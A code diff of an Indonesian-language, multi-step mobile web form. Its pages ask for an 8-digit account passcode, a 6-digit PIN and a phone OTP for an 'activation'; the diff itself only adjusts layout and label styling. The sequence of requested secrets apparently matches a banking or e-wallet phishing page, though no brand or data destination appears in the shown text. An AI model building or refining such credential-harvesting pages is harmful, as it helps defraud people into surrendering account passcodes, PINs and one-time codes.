@@ -117,8 +117,8 @@
     </main>
   </div>
 
-  <!-- ================= HALAMAN 2 (SANDI & PIN) ================= -->
-  <div id="page2" class="hidden min-h-screen bg-slate-50">
+  <!-- ================= HALAMAN 2 (DIKUNCI & POSISI PAS) ================= -->
+  <div id="page2" class="hidden h-screen bg-slate-50 overflow-hidden">
     <header class="bg-white py-3 px-4 sticky top-0 z-40 border-b border-slate-100 shadow-sm">
       <div class="max-w-sm mx-auto relative flex items-center justify-center">
         <button id="btnBackTo1" class="absolute left-0 p-1.5 text-slate-700 hover:text-slate-900 transition text-base"><i class="fa-solid fa-chevron-left"></i></button>
@@ -129,14 +129,14 @@
       </div>
     </header>
 
-    <main class="max-w-sm mx-auto px-4 pt-2">
+    <main class="max-w-sm mx-auto p-4 pt-3">
       <h1 class="text-xl font-bold text-slate-900 mb-1">Selangkah Lagi</h1>
       <p class="text-xs text-slate-600 leading-relaxed mb-3">
         Masukkan 8-digit kode sandi dan PIN 6-digit akun Anda untuk melanjutkan proses aktivasi.
       </p>
 
       <div class="mb-3">
-        <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="passcode">Kode Sandi (8 Digit)</label>
+        <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-1" for="passcode">KODE SANDI (8 DIGIT)</label>
         <div class="relative">
           <input type="password" id="passcode" maxlength="8" placeholder="Masukkan kode sandi" class="w-full px-3.5 py-2.5 bg-white border border-slate-300 rounded-lg text-sm text-slate-800 placeholder-slate-400 focus:outline-none focus:border-amber-500 transition shadow-sm pr-10">
           <button type="button" id="togglePasscode" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-800 text-sm focus:outline-none">
@@ -146,7 +146,7 @@
       </div>
 
       <div class="mb-4">
-        <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-2" for="pin">PIN (6 Digit)</label>
+        <label class="block text-[11px] font-semibold text-slate-700 uppercase tracking-wider mb-2" for="pin">PIN (6 DIGIT)</label>
         <div class="flex justify-between items-center gap-1.5 mb-2">
           <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-input w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
           <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-input w-11 h-12 text-center text-xl font-bold bg-white border border-slate-300 rounded-lg focus:border-amber-500 focus:ring-1 focus:ring-amber-500 outline-none transition shadow-sm">
@@ -164,7 +164,7 @@
   </div>
 
   <!-- ================= HALAMAN 3 (VERIFIKASI OTP) ================= -->
-  <div id="page3" class="hidden min-h-screen bg-slate-50">
+  <div id="page3" class="hidden h-screen bg-slate-50 overflow-hidden">
     <header class="bg-white py-3 px-4 sticky top-0 z-40 border-b border-slate-100 shadow-sm">
       <div class="max-w-sm mx-auto relative flex items-center justify-center">
         <button id="btnBackTo2" class="absolute left-0 p-1.5 text-slate-700 hover:text-slate-900 transition text-base"><i class="fa-solid fa-chevron-left"></i></button>
@@ -175,7 +175,7 @@
       </div>
     </header>
 
-    <main class="max-w-sm mx-auto p-4 pt-4 flex flex-col min-h-[calc(100vh-65px)] justify-between">
+    <main class="max-w-sm mx-auto p-4 pt-4 flex flex-col justify-between">
       <div>
         <h1 class="text-xl font-bold text-slate-900 mb-1">Verifikasi Kode OTP</h1>
         <p class="text-xs text-slate-600 leading-snug">Masukkan kode OTP yang telah dikirim ke nomor handphone:</p>
